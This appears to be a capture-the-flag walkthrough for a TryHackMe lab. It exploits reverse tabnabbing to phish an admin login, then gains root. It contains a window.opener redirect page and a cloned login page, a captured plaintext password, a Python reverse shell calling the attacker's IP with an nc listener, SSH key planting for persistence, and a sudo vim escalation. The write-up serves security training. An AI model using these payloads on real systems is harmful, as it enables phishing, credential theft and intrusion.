
>"Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one."
https://owasp.org/www-community/attacks/Reverse_Tabnabbing
# Rustscan
```bash
rustscan -a 10.10.184.22 --ulimit 7000 -- -sC -sV   
```
### Open Ports
HTTP:80 | Apache httpd 2.4.41 ((Ubuntu))
SSH:22 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)

# Gobuster
```bash
gobuster dir -u http://10.10.184.22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 
```
## Directories 

| Directories | Status Code | Full-URL                   |
| ----------- | ----------- | -------------------------- |
| /admin      | 312         | http://10.10.184.22/admin/ |

# Enumeration
## Exploitting underscore blank
https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing

Start a python server on port 80 and 8000
```bash
nano mal.html
```
```html
<!DOCTYPE html>
<html>
 <body>
  <script>
  window.opener.location = "http://10.6.53.104:8000/malicious_redir.html";
  </script>
 </body>
</html>
```

```bash
nano login.html
```

Take the source page of the login form
```html
<!DOCTYPE html>
<html lang="en">   
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>     
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">                                               
    <style>
        body{ font: 14px sans-serif; text-align: center; }    
    </style>     
</head>
<body>
	<h1 class="my-5">Hello, <b>test</b>! Welcome to our free blog promotions site.</h1>                                         
    <h1 class="my-5">Please submit your link so that we can get started.<br> All links will be reviewed by our admin who also built this site!</h1>
    <form action="" method="post">          
                <label for="link">Blog Link:</label>
                <input type="text" placeholder='http://visitme.com/' id="link" name="url"><br><br>
                <input type="submit" name="submit" value="Submit">
                <br>
                <br>
                <p>Thank you for your submission, you have entered: <a href='http://10.6.53.104:8000/mal.html' target='_blank' >Here</a></p>    </form> 
    <br>
    <p>
        <a href="reset-password.php" class="btn btn-warning">Reset Your Password</a>
        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>
    </p>

</body>
</html>
```

# Wireshark
Using Wireshark, we can easily see the username and password of the user.

![Pasted image 20240617150919](https://github.com/BGhoster/Write-Ups/assets/43526966/5add2574-50c4-462a-9e36-9e0d9ff69a3c)

### username password
username Daniel
password=C@ughtm3napping123
# User.txt
```bash
ssh daniel@10.10.184.22
```

```bash
id
```


### Finding files with group admin privileges
```bash
find / -group administrators -type f 2>/dev/null
```

or
### PSPY
![Pasted image 20240617152236](https://github.com/BGhoster/Write-Ups/assets/43526966/549e6b64-4711-4f92-bf9a-46eb838f5fc5)

## Getting reverse shell
Add reverse shell to query.py and wait for the shell. We can change this file because we are part of the administrator group.
![Pasted image 20240617153532](https://github.com/BGhoster/Write-Ups/assets/43526966/00ce065d-8511-4676-a5a8-ac9f9228c188)

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.53.104",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
```
```bash
rlwrap nc -lvnp 7777
```

## Upgrading to SSH connection
On your attacker machine, enter the following commands to get SSH on victim machine
```bash
ssh-keygen -t rsa
```
```bash
cd .ssh
```
```bash
cat id_rsa.pub
```

On the victim's machine, enter these commands into authorized_keys
```bash
cd .ssh
```
```bash
echo "YOUR id_RSA key" > authorized_keys
```
```bash
ssh adrian@10.10.184.22
```

```bash
cat user.txt
```
	THM{REMOVED}

## Privilege Escalation 
```bash
sudo -l
```
![Pasted image 20240617154627](https://github.com/BGhoster/Write-Ups/assets/43526966/ad73d5fc-85ca-4a9f-b18e-6955b05603fa)

```bash
sudo vim -c ':!/bin/sh'
```
```bash
cd /root; cat root.txt
```
	THM{REMOVED}


Resources
https://www.linkedin.com/pulse/writeup-napping-tryhackmethm-medium-vojt%25C4%259Bch-tr%25C4%258Dka-mjmbf/
https://owasp.org/www-community/attacks/Reverse_Tabnabbing
